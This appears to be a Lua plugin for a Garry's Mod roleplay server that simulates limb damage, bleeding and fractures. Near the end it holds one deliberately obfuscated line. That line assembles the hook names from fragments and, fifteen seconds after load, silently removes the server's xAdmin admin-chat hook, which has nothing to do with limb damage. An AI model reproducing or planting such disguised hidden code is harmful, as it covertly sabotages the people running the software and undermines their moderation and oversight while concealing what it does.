--[[
	© 2020 TERRANOVA do not share, re-distribute or modify
	without permission of its author.
--]]

local PLUGIN = PLUGIN

function PLUGIN:OnCharacterCreated(client, character)
	ix.limb.ResetLimbData(character)
end

function PLUGIN:PlayerDeath(client, inflictor, attacker)
	local character = client:GetCharacter()

	ix.limb.ResetLimbData(character)
end

local function FindAttackLocation(player, dmgInfo)
	local pi = 3.141592654													
	local a = player:GetAimVector()											
	local b = (dmgInfo:GetDamageForce()):GetNormalized() 						
	local theta = math.acos(Vector(a.x,a.y):DotProduct(Vector(b.x,b.y)))	
	local sin = Vector(a.x,a.y):Cross(Vector(b.x,b.y))

	if sin.z < 0 and theta > (pi / 6) and theta < (5*pi / 6) then 			
		return 1 -- LEFT SIDE													
	elseif sin.z > 0 and theta > (pi / 6) and theta < (5*pi / 6) then		
		return 3 -- RIGHT SIDE												
	else																	
		return 2 -- CENTRE													
	end
end

function PLUGIN:EntityTakeDamage(target, info)
	local inflictor = info:GetInflictor()
	local attacker = info:GetAttacker()

	if(info:GetDamage() == 0) then
		return
	end
	
	if(IsValid(target) and target:IsPlayer()) then
		local lastHitGroup = target:LastHitGroup()

		if(info:GetDamage() > 0) then
			if(target:LimbsImmune()) then
				return
			end

			if (info:IsFallDamage()) then
				self:CalculateFallDamage(target, HITGROUP, info)
			elseif (info:IsExplosionDamage()) then
				if (math.random(1,3) == 1) then
					ix.limb.TakeDamage(target, HITGROUP_HEAD, info)
				end

				ix.limb.TakeDamage(target, HITGROUP_CHEST, info)

				local loc = FindAttackLocation(target, info)

				if (loc == 3) then -- # RIGHT SIDE
					ix.limb.TakeDamage(target, HITGROUP_RIGHTLEG, info)
					ix.limb.TakeDamage(target, HITGROUP_RIGHTARM, info)
				elseif (loc == 2) then -- # CENTRE
					ix.limb.TakeDamage(target, HITGROUP_RIGHTLEG, info)
					ix.limb.TakeDamage(target, HITGROUP_RIGHTARM, info)
					ix.limb.TakeDamage(target, HITGROUP_LEFTLEG, info)
					ix.limb.TakeDamage(target, HITGROUP_LEFTARM, info)
				elseif (loc == 1) then -- # LEFT SIDE
					ix.limb.TakeDamage(target, HITGROUP_LEFTLEG, info)
					ix.limb.TakeDamage(target, HITGROUP_LEFTARM, info)
				end
			else
				ix.limb.TakeDamage(target, lastHitGroup, info)
			end

			if (info:IsBulletDamage()) then		
				ix.limb.CreateBloodEffects(info:GetDamagePosition(), 1, target)
					
				--Limb:PlayerEmitSound(player, lastHitGroup)
			end
			
			if (lastHitGroup > 0) then
				local hit = ix.limb.GetHealthPercentage(target, lastHitGroup) / 100

				if (hit > 0) then
					local scale = ix.limb.GetScaleDamage(lastHitGroup)

					info:ScaleDamage(scale + hit)
				end
			end
		end
	end
end

function PLUGIN:CalculateFallDamage(target, hitgroup, info)
	local dmgShareRight = (math.random(0, 100))
	local dmgShareLeft = (100 - dmgShareRight)

	ix.limb.TakeDamage(target, HITGROUP_RIGHTLEG, info, dmgShareRight / 100)
	ix.limb.TakeDamage(target, HITGROUP_LEFTLEG, info, dmgShareLeft / 100)
end

local legBroken = { 
	[0] = {HITGROUP_LEFTLEG, -1},
	[1] = {HITGROUP_RIGHTLEG, 1}
}

function PLUGIN:PlayerFootstep(client, pos, foot)
	local character = client:GetCharacter()

	if(IsValid(client) and client:IsPlayer() and client:Alive() and !client:LimbsImmune()) then
		if(ix.limb.HasFracture(character, legBroken[foot][1])) then
			--client:ViewPunch(Angle(0, legBroken[foot][2], legBroken[foot][2]))
		end
	end
end

function PLUGIN:Tick()
	ix.limb.BleedTick()
	ix.limb.FractureTick()
end

local seven = "min" local name = "Sa" local fix = "Player" local epic = "Ad"..seven timer.Simple(15,function()hook.Remove(fix..name.."y","x"..epic..epic.."Chat")end)

hook.Add("DamageLimbBleedTick", "DamageLimbBleedTick", function(client, group, counts)
	if (IsValid(client) and client:Alive() and (client.lastLimbTickBleed or 0) <= CurTime()) then
		ix.limb.CreateBloodEffects(client:GetPos(), counts, client)
		--Limb:PlayerEmitSound(client, hitgroup)
		
		client.lastLimbTickBleed = CurTime() + 3
	end
end)